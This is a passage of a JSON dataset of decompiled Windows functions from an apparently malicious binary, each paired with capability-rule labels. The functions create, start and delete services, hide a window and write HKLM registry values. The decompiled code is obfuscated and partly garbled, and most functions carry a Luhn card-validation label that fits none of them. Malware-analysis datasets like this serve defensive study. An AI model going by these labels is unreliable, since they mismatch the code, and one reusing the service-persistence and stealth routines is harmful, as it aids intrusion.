*(param_3 + 1) = 0x9c;\n    bVar5 = param_2 != 'Q';\n    *(param_3 + 2) = 0xe3;\n    if ((bVar5) && (!bVar5)) {\n        puVar4 = &stack0xffffffe8;\n        cVar1 = '\\x10';\n        do {\n            puVar3 = puVar3 + -1;\n            puVar4 = puVar4 + -1;\n            *puVar4 = *puVar3;\n            cVar1 = cVar1 + -1;\n        } while ('\\0' < cVar1);\n    }\n    *(param_3 + 3) = 0x4a;\n    *(param_3 + 1) = 0x4f;\n    *(param_3 + 5) = 0xc2;\n    *(param_3 + 6) = 0x53;\n    *(param_3 + 7) = 0x97;\n    bVar5 = unaff_EBX + 1 < 0;\n    *(param_3 + 2) = 0xd3;\n    if ((SCARRY4(unaff_EBX, 1) == bVar5) && (SCARRY4(unaff_EBX, 1) != bVar5)) {\n        *(in_EAX + 0x8316dbec) = in_ST0;\n        *param_2 = *param_2 + 0x46c6df84;\n        *param_2 = *param_2 | param_3;\n    }\n    else {\n        *(param_3 + 9) = 0x32;\n    }\n    bVar5 = (param_2 & 0x66) == 0;\n    *(param_3 + 10) = 0x4b;\n    if ((bVar5) || (!bVar5)) {\n        *(param_3 + 0xb) = 0xf;\n    }\n    *(param_3 + 3) = 0x87;\n    *(param_2 + 1U | 0x5f) = 0xd;\n    return;\n}\n",
        "token_count": 930
    },
    "004011c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004011f5) overlaps instruction at (ram,0x004011f4)\n// \n// WARNING: Removing unreachable block (ram,0x004011e5)\n\nvoid __cdecl fcn.004011c0(uint *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_68h = 0;\n    puVar2 = &var_67h;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    fcn.00401260(&var_68h, &var_4h);\n    fcn.00402c80(&var_68h, var_4h, 0x411150, 0x13000);\n    *arg_8h = 0x411150;\n    *arg_ch = 0x13000;\n    return;\n}\n",
        "token_count": 285
    },
    "00401560": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00401560(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00402520(arg_8h, 1);\n    return iVar1 != 0;\n}\n",
        "token_count": 52
    },
    "004026a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004026a0(uint hSCManager, uint lpServiceName)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t unaff_EDI;\n    bool in_SF;\n    float10 in_ST0;\n    \n    if ((!in_SF) && (in_SF)) {\n        *(unaff_EDI + 0x1c) = in_ST0;\n    }\n    iVar2 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)(hSCManager, lpServiceName, 0xf01ff);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    iVar3 = (*_sym.imp.ADVAPI32.dll_StartServiceA)(iVar2, 0, 0);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetLastError;\n    if (iVar3 == 0) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar3 != 0x420) {\n            iVar3 = (*pcVar1)();\n            if (iVar3 != 0x422) {\n                (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n                return 0;\n            }\n        }\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n    return 1;\n}\n",
        "token_count": 295
    },
    "00402c20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402c5e) overlaps instruction at (ram,0x00402c5d)\n// \n\nuint __cdecl fcn.00402c20(int32_t arg_8h)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    uint8_t *unaff_EDI;\n    uchar in_CF;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint32_t hSCManager;\n    uint uVar5;\n    int32_t iVar4;\n    \n    uVar5 = 0;\n    iVar3 = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0, 0, 0xf003f);\n    if ((in_CF) || (iVar4 = iVar3,  !in_CF)) {\n        iVar4 = arg_8h;\n    }\n    uVar2 = iVar4;\n    cVar1 = uVar2 - *unaff_EDI;\n    hSCManager = (in_NT & 1) * 0x4000 | SBORROW1(uVar2, *unaff_EDI) * 0x800 | (in_IF & 1) * 0x200 | (in_TF & 1) * 0x100\n                 | (cVar1 < '\\0') * 0x80 | (cVar1 == '\\0') * 0x40 | (in_AF & 1) * 0x10 |\n                 ((POPCOUNT(cVar1) & 1U) == 0) * 4 | uVar2 < *unaff_EDI | (in_ID & 1) * 0x200000 |\n                 (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000;\n    func_0x10188bd0();\n    uVar5 = fcn.004026a0(hSCManager, uVar5);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar3 + -1);\n    return uVar5;\n}\n",
        "token_count": 517
    },
    "00402d10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402d42) overlaps instruction at (ram,0x00402d40)\n// \n\nchar * __cdecl fcn.00402d10(char *arg_8h, int32_t arg_ch, char *arg_10h, int32_t arg_14h)\n\n{\n    int32_t iVar1;\n    char *pcVar2;\n    char *pcVar3;\n    char *pcVar4;\n    bool bVar5;\n    \n    pcVar2 = arg_8h + (arg_ch - arg_14h);\n    if (arg_14h == 0) {\n        return arg_8h;\n    }\n    pcVar3 = arg_10h;\n    if ((arg_14h < 0) || (arg_14h >= 0)) {\n        bVar5 = SBORROW4(arg_8h, pcVar2);\n        if (pcVar2 < arg_8h) {\n            return NULL;\n        }\n    }\n    else {\n        bVar5 = SCARRY4(arg_8h, 0x4877c23b);\n        arg_8h = arg_8h + 0x4877c23b;\n    }\n    do {\n        if ((!bVar5) && (bVar5)) {\n            LOCK();\n            pcVar3 = 0x138b2633;\n            arg_8h = arg_8h + 0x658f517f;\n        }\n        if (*arg_8h == *pcVar3) {\n            iVar1 = arg_14h + -1;\n            bVar5 = true;\n            pcVar4 = arg_8h;\n            do {\n                pcVar3 = pcVar3 + 1;\n                pcVar4 = pcVar4 + 1;\n                if (iVar1 == 0) break;\n                iVar1 = iVar1 + -1;\n                bVar5 = *pcVar4 == *pcVar3;\n            } while (bVar5);\n            pcVar3 = arg_10h;\n            if (bVar5) {\n                return arg_8h;\n            }\n        }\n        arg_8h = arg_8h + 1;\n        bVar5 = SBORROW4(arg_8h, pcVar2);\n        if (pcVar2 < arg_8h) {\n            return NULL;\n        }\n    } while( true );\n}\n",
        "token_count": 519
    },
    "00402e20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00402e3c) overlaps instruction at (ram,0x00402e37)\n// \n\nuint64_t __cdecl fcn.00402e20(uint arg_8h, uint arg_ch)\n\n{\n    uint32_t hSCManager;\n    uint uVar1;\n    uint extraout_EDX;\n    uint32_t unaff_EDI;\n    bool bVar2;\n    bool bVar3;\n    bool bVar4;\n    uint64_t uVar5;\n    \n    hSCManager = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0, 0, 0xf003f);\n    bVar2 = unaff_EDI < hSCManager;\n    bVar4 = SBORROW4(unaff_EDI, hSCManager);\n    bVar3 = unaff_EDI == hSCManager;\n    uVar5 = fcn.00403470(hSCManager, arg_8h);\n    if (!bVar2 && !bVar3) {\n        if (bVar2 || bVar3) {\n            if (!bVar4) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            return uVar5 & 0xffffffff |\n                   (uVar5 >> 0x20 & 0xffff0000 | CONCAT11((uVar5 >> 0x28) + (hSCManager >> 8), uVar5 >> 0x20)) << 0x20;\n        }\n    }\n    uVar1 = fcn.004015f0(hSCManager, arg_8h, arg_ch);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(hSCManager);\n    return CONCAT44(extraout_EDX, uVar1);\n}\n",
        "token_count": 395
    },
    "00403220": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403280) overlaps instruction at (ram,0x0040327e)\n// \n// WARNING: Control flow encountered bad instruction data\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Removing unreachable block (ram,0x004033e9)\n// WARNING: Removing unreachable block (ram,0x0040326d)\n// WARNING: Removing unreachable block (ram,0x0040331a)\n// WARNING: Removing unreachable block (ram,0x00403337)\n// WARNING: Removing unreachable block (ram,0x00403339)\n// WARNING: Removing unreachable block (ram,0x0040334f)\n// WARNING: Removing unreachable block (ram,0x00403351)\n// WARNING: Removing unreachable block (ram,0x00403385)\n// WARNING: Removing unreachable block (ram,0x00403387)\n// WARNING: Removing unreachable block (ram,0x00403394)\n// WARNING: Removing unreachable block (ram,0x00403396)\n// WARNING: Removing unreachable block (ram,0x0040339b)\n// WARNING: Removing unreachable block (ram,0x0040339d)\n// WARNING: Removing unreachable block (ram,0x004033a3)\n// WARNING: Removing unreachable block (ram,0x004033ad)\n// WARNING: Removing unreachable block (ram,0x004033ae)\n// WARNING: Removing unreachable block (ram,0x004033be)\n// WARNING: Removing unreachable block (ram,0x004033c0)\n// WARNING: Removing unreachable block (ram,0x004033cd)\n// WARNING: Removing unreachable block (ram,0x004033cf)\n// WARNING: Removing unreachable block (ram,0x004033d5)\n// WARNING: Removing unreachable block (ram,0x004033d7)\n// WARNING: Removing unreachable block (ram,0x004033dc)\n// WARNING: Removing unreachable block (ram,0x004033de)\n// WARNING: Removing unreachable block (ram,0x004033e0)\n// WARNING: Removing unreachable block (ram,0x004033f9)\n// WARNING: Removing unreachable block (ram,0x0040342e)\n// WARNING: Removing unreachable block (ram,0x00403412)\n// WARNING: Removing unreachable block (ram,0x00403425)\n// WARNING: Removing unreachable block (ram,0x00403431)\n// WARNING: Removing unreachable block (ram,0x00403458)\n// WARNING: Removing unreachable block (ram,0x0040345f)\n// WARNING: Removing unreachable block (ram,0x004033fe)\n\nuint fcn.00403220(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    int32_t *piVar4;\n    uchar *puVar5;\n    uint32_t unaff_ESI;\n    ushort in_SS;\n    bool bVar6;\n    unkbyte10 extraout_ST0;\n    ulong uVar7;\n    uchar *puStack820;\n    uint *puStack816;\n    uchar auStack800 [260];\n    uchar auStack540 [260];\n    uchar auStack280 [260];\n    uchar auStack20 [4];\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack16 = 0x104;\n    puStack816 = &uStack16;\n    puStack820 = auStack540;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_GetUserNameA)();\n    if (iVar1 == 0) {\n        return 0;\n    }\n    uStack8 = 0x104;\n    uStack12 = 0x104;\n    puVar5 = auStack20;\n    puVar3 = &uStack12;\n    while( true ) {\n        uVar7 = (*_sym.imp.ADVAPI32.dll_LookupAccountNameA)\n                          (0, auStack540, auStack280, &uStack8, auStack800, puVar3, puVar5);\n        puVar5 = uVar7;\n        if (puVar5 == NULL) {\n            return 0;\n        }\n        if ((puVar5 < 0) || (piVar4 = uVar7 >> 0x20,  puVar5 >= 0)) {\n            puVar5 = auStack280;\n            piVar4 = param_1;\n        }\n        *(puVar5 + -0x7ce92414) = extraout_ST0;\n        *piVar4 = *piVar4 + 0x558bdf84;\n        (*piVar4[0x14])();\n        uVar2 = (*_sym.imp.ADVAPI32.dll_ConvertSidToStringSidA)();\n        bVar6 = (POPCOUNT(uVar2 & 0xff) & 1U) == 0;\n        if (uVar2 == 0) {\n            return 0;\n        }\n        if (bVar6) {\n            return 1;\n        }\n        if (!bVar6) break;\n        piVar4 = segment(in_SS, *0x10 + -0x354);\n        puVar3 = *piVar4;\n        puVar5 = 0xb7bc9ea5;\n        if (!bVar6) {\n            *((&puStack820 ^ unaff_ESI) - 4) = 0xb7bc9ea5;\n            return 1;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 1184
    },
    "004037c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004037c0(uint arg_8h, uint arg_ch)\n\n{\n    uint arg_8h_00;\n    uint arg_ch_00;\n    int32_t iVar1;\n    \n    arg_ch_00 = arg_ch;\n    arg_8h_00 = arg_8h;\n    iVar1 = fcn.004045b0(arg_8h, arg_ch, &arg_8h, &arg_ch);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    *(iVar1 + 0x58) = arg_ch;\n    fcn.004045b0(arg_8h_00, arg_ch_00, &arg_8h, &arg_ch);\n    return 1;\n}\n",
        "token_count": 164
    },
    "00403830": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00403830(uint param_1, uint param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_wcslen)(param_1);\n    (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0, 0, param_1, iVar1 + 1, param_2, param_3, 0, 0);\n    return;\n}\n",
        "token_count": 102
    },
    "00404500": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create or open registry key"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00404524) overlaps instruction at (ram,0x00404520)\n// \n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Removing unreachable block (ram,0x0040458a)\n\nuint __fastcall fcn.00404500(uint param_1, char *param_2, char *param_3, uint param_4)\n\n{\n    uchar *in_EAX;\n    int32_t iVar1;\n    uint extraout_ECX;\n    uchar *puVar2;\n    uchar *puVar3;\n    uint uVar4;\n    uint *unaff_EDI;\n    bool in_CF;\n    bool in_ZF;\n    uint uStack8;\n    \n    uStack8 = param_1;\n    if ((in_CF || in_ZF) || (!in_CF && !in_ZF)) {\n        in_EAX = &stack0xfffffff8;\n        param_1 = param_4;\n        param_2 = param_3;\n    }\n    uVar4 = 5;\n    *unaff_EDI = *0x1;\n    *(in_EAX + -4) = 0x8be181cf;\n    *0xf4327e14 = *0xf4327e14 | param_1;\n    *(unaff_EDI + 1) = *(unaff_EDI + 1) + param_1;\n    *param_2 = *param_2 + (param_1 >> 8);\n    *(in_EAX + -8) = param_1;\n    *(in_EAX + -0xc) = param_2;\n    puVar2 = in_EAX + -0x10;\n    *(in_EAX + -0x10) = 0x40453d;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)();\n    if (iVar1 == 0) {\n        *(puVar2 + -4) = extraout_ECX;\n        *(puVar2 + -4) = *0x8be181eb;\n        *(puVar2 + -8) = *0x8be181e7;\n        *(puVar2 + -0xc) = *0x8be181e3;\n        *(puVar2 + -0x10) = 0;\n        *(puVar2 + -0x14) = *0x8be181df;\n        *(puVar2 + -0x18) = *0x8be181cb;\n        puVar3 = puVar2 + -0x1c;\n        *(puVar2 + -0x1c) = 0x404579;\n        iVar1 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)();\n        if (iVar1 != 0) {\n            uVar4 = 0;\n        }\n        *(puVar3 + -4) = uVar4;\n        uVar4 = *(puVar3 + -4);\n        *(puVar3 + -4) = *0x8be181cb;\n        *(puVar3 + -8) = 0x4045a1;\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)();\n        return uVar4;\n    }\n    return 0;\n}\n",
        "token_count": 713
    },
    "00404d00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00404d8f) overlaps instruction at (ram,0x00404d8d)\n// \n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00404d00(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, uint32_t arg_14h, int32_t arg_18h)\n\n{\n    char *pcVar1;\n    uint8_t uVar2;\n    char cVar3;\n    uint uVar4;\n    char cVar5;\n    unkbyte10 Var6;\n    unkbyte10 Var7;\n    uint8_t uVar8;\n    uint32_t uVar9;\n    int32_t iVar10;\n    uint8_t extraout_CL;\n    uint8_t uVar11;\n    uint32_t uVar12;\n    uint8_t uVar14;\n    char extraout_DH;\n    int32_t *piVar13;\n    uint32_t unaff_EDI;\n    uint16_t in_CS;\n    uint8_t in_AF;\n    bool bVar15;\n    bool bVar16;\n    unkbyte10 in_ST0;\n    unkbyte10 extraout_ST0;\n    unkbyte10 in_ST1;\n    unkbyte10 extraout_ST1;\n    unkbyte10 in_ST2;\n    unkbyte10 in_ST3;\n    unkbyte10 in_ST4;\n    unkbyte10 in_ST5;\n    unkbyte10 in_ST6;\n    unkbyte10 Var17;\n    unkbyte10 in_ST7;\n    unkbyte10 Var18;\n    uint var_10h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    uint var_1h;\n    \n    var_ch = 0;\n    if (0 < arg_14h) {\n        var_8h = 1;\n        uVar9 = arg_14h * 2;\n        do {\n            uVar12 = uVar9 & 0xffffff00 | *(var_ch + arg_10h);\n            uVar11 = arg_10h;\n            uVar14 = arg_10h >> 8;\n            bVar16 = SCARRY1(uVar11, uVar14);\n            bVar15 = uVar11 + uVar14 < '\\0';\n            uVar2 = *(var_8h % arg_ch + arg_8h);\n            piVar13 = var_8h % arg_ch & 0xffffff00U | uVar2;\n            if (((bVar16 == bVar15) && (uVar12 = uVar9 & 0xffff0000 | *(var_ch + arg_10h),  bVar16 != bVar15)) ||\n               (Var18 = in_ST3,  Var6 = in_ST4,  Var7 = in_ST5,  Var17 = in_ST6,  bVar16 == bVar15)) {\n                *(var_8h / arg_ch + -0x7ce92414) = in_ST0;\n                uVar9 = var_8h / arg_ch - 1;\n                in_AF = 9 < (uVar9 & 0xf) | in_AF;\n                uVar8 = uVar9 + in_AF * '\\x06';\n                cVar5 = uVar9 >> 8;\n                *piVar13 = *piVar13 + -0x73f0207c;\n                uVar4 = LocalDescriptorTableRegister();\n                *(uVar9 & 0xffffff00 |\n                 uVar8 + (0x90 < (uVar8 & 0xf0) | CARRY1(uVar11, uVar14) | in_AF * (0xf9 < uVar8)) * '`') = uVar4;\n                pcVar1 = arg_ch + 0x51;\n                cVar3 = *pcVar1;\n                *pcVar1 = *pcVar1 + cVar5;\n                uVar12 = uVar12 & 0xffff0000 | var_8h & 0xffff;\n                in_ST0 = in_ST1;\n                in_ST1 = in_ST2;\n                in_ST2 = in_ST3;\n                Var18 = in_ST4;\n                Var6 = in_ST5;\n                Var7 = in_ST6;\n                Var17 = in_ST7;\n                if (SCARRY1(cVar3, cVar5) == *pcVar1 < '\\0') goto code_r0x00404d8f;\n                unaff_EDI = unaff_EDI & 0xffff0000 | in_CS;\n                Var18 = in_ST7;\n                iVar10 = (*(uVar12 + 0xc32fef7))(unaff_EDI);\n                bVar15 = SBORROW1(extraout_DH, *(iVar10 + 0x16));\n                in_ST0 = extraout_ST0;\n                in_ST1 = extraout_ST1;\n                Var17 = in_ST7;\n                in_ST7 = Var18;\n                uVar11 = extraout_CL;\n            }\n            else {\ncode_r0x00404d8f:\n                in_ST6 = Var7;\n                in_ST5 = Var6;\n                in_ST4 = Var18;\n                in_ST3 = in_ST2;\n                bVar15 = false;\n                uVar11 = uVar12 ^ *((var_8h - 1) % arg_ch + arg_8h);\n            }\n            if (bVar15) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            var_10h._0_1_ = arg_14h * 2;\n            *(arg_18h + -1 + var_8h) = var_10h ^ uVar11;\n            *(var_8h + arg_18h) = var_10h ^ uVar2;\n            var_8h = var_8h + 2;\n            var_ch = var_ch + 1;\n            uVar9 = arg_14h;\n            in_ST2 = in_ST3;\n            in_ST3 = in_ST4;\n            in_ST4 = in_ST5;\n            in_ST5 = in_ST6;\n            in_ST6 = Var17;\n        } while (var_ch < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 1376
    },
    "00404e20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "set registry value"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00404e69)\n// WARNING: Removing unreachable block (ram,0x00404e88)\n// WARNING: Removing unreachable block (ram,0x00404e8a)\n\nbool fcn.00404e20(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t unaff_EBX;\n    char in_AF;\n    bool bVar3;\n    uint var_4h;\n    \n    iVar2 = fcn.00403220(*0x10 + -8);\n    bVar3 = iVar2 == 0;\n    if (bVar3) {\n        return false;\n    }\n    if ((!bVar3) && (bVar3)) {\n        if (unaff_EBX + 1 == 0) {\n            iVar2 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)();\n            return iVar2 == 0;\n        }\n        piVar1 = (CONCAT11(in_AF, in_AF * '\\x06') & 0xff0f) + 0x2a;\n        *piVar1 = *piVar1 - (unaff_EBX + 1);\n    }\n    return false;\n}\n",
        "token_count": 264
    },
    "004013c0": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004013c0(uint arg_8h)\n\n{\n    (*_sym.imp.KERNEL32.dll_CreateFileA)(arg_8h, 0xc0000000, 1, 0, 3, 0x80, 0);\n    return;\n}\n",
        "token_count": 64
    },
    "00404c90": {
        "rules": [
            "hide graphical window"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404c90(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.USER32.dll_CreateWindowExA)\n                      (0, 0x424150, 0x42462c, 0xcf0000, 0x80000000, 0, 0x80000000, 0, 0, 0, arg_8h, 0);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    (*_sym.imp.USER32.dll_ShowWindow)(iVar1, 0);\n    return 1;\n}\n",
        "token_count": 139
    },
    "004015f0": {
        "rules": [
            "get service handle",
            "create service"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004015f0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    uVar2 = &stack0xfffffffc & 0xffff0000 | *0x10 - 4;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_CreateServiceA)\n                      (*(uVar2 + 8), *(uVar2 + 0xc), *(uVar2 + 0xc), 0xf01ff, 1, 0, 1, *(uVar2 + 0x10), 0, 0, 0, 0, 0);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar1);\n    return 1;\n}\n",
        "token_count": 193
    },
    "00403470": {
        "rules": [
            "get service handle",
            "delete service"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004034b5) overlaps instruction at (ram,0x004034b3)\n// \n// WARNING: Unable to track spacebase fully for stack\n\nuint __cdecl fcn.00403470(uint hSCManager, uint lpServiceName)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint extraout_ECX;\n    int32_t unaff_EBX;\n    uint32_t uVar4;\n    uchar *puVar5;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    \n    uStack16 = 0xf01ff;\n    uStack20 = lpServiceName;\n    uStack24 = hSCManager;\n    iVar2 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)();\n    pcVar1 = _sym.imp.ADVAPI32.dll_DeleteService;\n    if (iVar2 != 0) {\n        uVar4 = &stack0xffffffe8 ^ *(unaff_EBX + 0x56);\n        puVar5 = uVar4 - 4;\n        *(uVar4 - 4) = 0x4034bc;\n        uVar3 = (*pcVar1)();\n        *(puVar5 + -4) = extraout_ECX;\n        *(puVar5 + -4) = iVar2;\n        pcVar1 = _sym.imp.ADVAPI32.dll_CloseServiceHandle;\n        *(puVar5 + -8) = 0x4034da;\n        (*pcVar1)();\n        return uVar3;\n    }\n    return 0;\n}\n",
        "token_count": 349
    },
    "00402fe0": {
        "rules": [
            "set registry value"
        ],
        "decompiled_code": "\nbool fcn.00402fe0(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x424334, 0x424378, 4, &stack0x00000004, 4);\n    return iVar1 == 0;\n}\n",
        "token_count": 78
    }
}